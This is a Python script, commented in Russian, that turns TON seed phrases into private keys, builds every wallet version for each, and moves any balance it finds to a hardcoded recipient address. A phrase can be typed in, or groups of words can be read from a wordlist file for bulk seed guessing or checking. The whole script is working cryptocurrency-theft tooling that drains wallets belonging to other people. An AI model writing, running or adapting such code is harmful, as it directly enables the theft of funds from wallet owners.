from pytoniq_core.crypto.keys import mnemonic_to_private_key
from tonutils.client import ToncenterClient
from tonutils.wallet import (
    WalletV2R1, WalletV2R2, WalletV3R1, WalletV3R2, WalletV4R1, WalletV4R2, WalletV5R1,
    HighloadWalletV2, HighloadWalletV3, PreprocessedWalletV2, PreprocessedWalletV2R1
)
import asyncio
import aiohttp

# Ключи для Toncenter API
TONCENTER_API_KEYS = {
    "mainnet": "654544d......80436",
    "testnet": "2871644......1abdf",
}

# Адреса для перевода средств
TRANSFER_ADDRESSES = {
    "mainnet": "UQCIc8nJVvAyOpckPI24Fsgx9IcI3BtGo81n6iIqXU0asofW",
    "testnet": "0QC9AevlAcsQk6uzXcWNMhmKZng5HEfXFMrRFr7T_EXQ1EL8",
}

# Получаем баланс через Toncenter API
async def get_balance(address, network):
    url = f"https://{'testnet.' if network == 'testnet' else ''}toncenter.com/api/v2/getAddressInformation"
    params = {"address": address}
    headers = {"X-API-Key": TONCENTER_API_KEYS[network]}

    async with aiohttp.ClientSession() as session:
        async with session.get(url, params=params, headers=headers) as response:
            data = await response.json()
            if data.get("ok"):
                return int(data["result"]["balance"])
            else:
                raise Exception(f"Ошибка при получении баланса: {data.get('error')}")

# Проверяем, развернут ли кошелек
async def is_wallet_deployed(address, network):
    try:
        # Получаем информацию о кошельке
        url = f"https://{'testnet.' if network == 'testnet' else ''}toncenter.com/api/v2/getAddressInformation"
        params = {"address": address}
        headers = {"X-API-Key": TONCENTER_API_KEYS[network]}

        async with aiohttp.ClientSession() as session:
            async with session.get(url, params=params, headers=headers) as response:
                data = await response.json()
                if data.get("ok"):
                    # Если кошелек развернут, его баланс будет больше 0
                    return int(data["result"]["balance"]) > 0
                else:
                    raise Exception(f"Ошибка при получении информации о кошельке: {data.get('error')}")
    except Exception as e:
        print(f"Ошибка при проверке развертывания кошелька: {e}")
        return False

# Отправляем транзакцию
async def send_transaction(wallet, network, destination, amount_ton, comment=""):
    try:
        address = wallet.address.to_str()

        # Проверяем, развернут ли кошелек
        if not await is_wallet_deployed(address, network):
            print(f"Кошелек {address} не развернут. Невозможно отправить транзакцию.")
            return

        # Комиссия в TON (0.05 TON)
        fee_ton = 0.05  # Комиссия в TON

        # Проверяем, достаточно ли средств для отправки с учетом комиссии
        if amount_ton + fee_ton > (await get_balance(address, network)) / 1e9:
            print(f"Недостаточно средств для отправки. Баланс: {(await get_balance(address, network)) / 1e9} TON, требуется: {amount_ton + fee_ton} TON.")
            return

        # Создаем транзакцию (сумма передается в TON)
        tx_hash = await wallet.transfer(
            destination=destination,
            amount=amount_ton,  # Сумма в TON
            body=comment,  # Используем body для передачи комментария
        )
        print(f"Успешно отправлено {amount_ton} TON на {destination}!")
        print(f"Комиссия: {fee_ton} TON")
        print(f"Хэш транзакции: {tx_hash}")
    except Exception as e:
        print(f"Ошибка при отправке транзакции для кошелька {address}: {e}")

# Создаем все версии кошельков
async def create_wallets(client, private_key):
    wallets = [
        WalletV2R1.from_private_key(client, private_key),
        WalletV2R2.from_private_key(client, private_key),
        WalletV3R1.from_private_key(client, private_key),
        WalletV3R2.from_private_key(client, private_key),
        WalletV4R1.from_private_key(client, private_key),
        WalletV4R2.from_private_key(client, private_key),
        WalletV5R1.from_private_key(client, private_key),
        HighloadWalletV2.from_private_key(client, private_key),
        HighloadWalletV3.from_private_key(client, private_key),
        PreprocessedWalletV2.from_private_key(client, private_key),
        PreprocessedWalletV2R1.from_private_key(client, private_key),
    ]
    return wallets

# Парсер слов из файла english.txt
def parse_words(word_count):
    with open("english.txt", "r") as file:
        words = file.read().splitlines()

    if word_count == 12:
        return [words[i:i + 12] for i in range(0, len(words), 12)]
    elif word_count == 24:
        return [words[i:i + 24] for i in range(0, len(words), 24)]
    elif word_count == 1:
        return [[word] for word in words]
    else:
        raise ValueError("Неподдерживаемое количество слов.")

# Основная функция
async def main():
    while True:
        # Запрашиваем выбор режима
        mode_choice = input("Выберите режим:\n1) Основной\n2) Парсер\n").strip()
        if mode_choice not in ["1", "2"]:
            print("Неверный выбор. Попробуйте снова.")
            continue

        if mode_choice == "1":
            # Основной режим
            while True:
                # Запрашиваем выбор сети
                network_choice = input("Выберите сеть:\n1) mainnet\n2) testnet\n3) mainnet + testnet\n").strip()
                if network_choice not in ["1", "2", "3"]:
                    print("Неверный выбор. Попробуйте снова.")
                    continue

                networks = []
                if network_choice == "1":
                    networks.append("mainnet")
                elif network_choice == "2":
                    networks.append("testnet")
                elif network_choice == "3":
                    networks.extend(["mainnet", "testnet"])

                # Запрашиваем сид-фразу
                mnemonic = input("Введите сид-фразу (или 'exit' для выхода): ").strip()
                if mnemonic.lower() == "exit":
                    break

                # Генерируем приватный ключ из сид-фразы
                try:
                    private_key = mnemonic_to_private_key(mnemonic.split(" "))[1]
                except Exception as e:
                    print(f"Ошибка при генерации приватного ключа: {e}")
                    continue

                # Обрабатываем выбранные сети
                for network in networks:
                    print(f"\n=== {network.upper()} ===")
                    client = ToncenterClient(api_key=TONCENTER_API_KEYS[network], is_testnet=(network == "testnet"))

                    # Создаем все версии кошельков
                    wallets = await create_wallets(client, private_key)

                    # Проверяем баланс и отправляем транзакции
                    for wallet in wallets:
                        address = wallet.address.to_str()
                        try:
                            balance_nano = await get_balance(address, network)
                            balance_ton = balance_nano / 1e9  # Конвертируем наноTON в TON
                            print(f"\nАдрес ({wallet.__class__.__name__}): {address}")
                            print(f"Баланс: {balance_ton} TON")

                            # Если баланс больше 0, отправляем транзакцию
                            if balance_ton > 0:
                                # Вычитаем комиссию 0.05 TON
                                amount_to_send = balance_ton - 0.05
                                if amount_to_send > 0:
                                    await send_transaction(wallet, network, TRANSFER_ADDRESSES[network], amount_to_send, "Transfer from wallet script")
                                else:
                                    print("Недостаточно средств для отправки после вычета комиссии.")
                        except Exception as e:
                            print(f"Ошибка при обработке кошелька {wallet.__class__.__name__}: {e}")

        elif mode_choice == "2":
            # Режим парсера
            word_count_choice = input("Выберите количество слов:\n1) 12\n2) 24\n3) 1\n").strip()
            if word_count_choice not in ["1", "2", "3"]:
                print("Неверный выбор. Попробуйте снова.")
                continue

            word_count = 12 if word_count_choice == "1" else 24 if word_count_choice == "2" else 1

            # Парсим слова из файла
            word_lists = parse_words(word_count)

            # Обрабатываем каждую группу слов
            for i, words in enumerate(word_lists[:2048]):  # Ограничиваем 2048 итерациями
                print(f"\n=== Группа слов {i + 1} ===")
                mnemonic = " ".join(words)
                print(f"Мнемоника: {mnemonic}")

                # Генерируем приватный ключ из сид-фразы
                try:
                    private_key = mnemonic_to_private_key(mnemonic.split(" "))[1]
                except Exception as e:
                    print(f"Ошибка при генерации приватного ключа: {e}")
                    continue

                # Обрабатываем каждую сеть
                for network in ["mainnet", "testnet"]:
                    print(f"\n=== {network.upper()} ===")
                    client = ToncenterClient(api_key=TONCENTER_API_KEYS[network], is_testnet=(network == "testnet"))

                    # Создаем все версии кошельков
                    wallets = await create_wallets(client, private_key)

                    # Проверяем баланс и отправляем транзакции
                    for wallet in wallets:
                        address = wallet.address.to_str()
                        try:
                            balance_nano = await get_balance(address, network)
                            balance_ton = balance_nano / 1e9  # Конвертируем наноTON в TON
                            print(f"\nАдрес ({wallet.__class__.__name__}): {address}")
                            print(f"Баланс: {balance_ton} TON")

                            # Если баланс больше 0, отправляем транзакцию
                            if balance_ton > 0:
                                # Вычитаем комиссию 0.05 TON
                                amount_to_send = balance_ton - 0.05
                                if amount_to_send > 0:
                                    await send_transaction(wallet, network, TRANSFER_ADDRESSES[network], amount_to_send, "Transfer from wallet script")
                                else:
                                    print("Недостаточно средств для отправки после вычета комиссии.")
                        except Exception as e:
                            print(f"Ошибка при обработке кошелька {wallet.__class__.__name__}: {e}")

# Запуск программы
if __name__ == "__main__":
    asyncio.run(main())
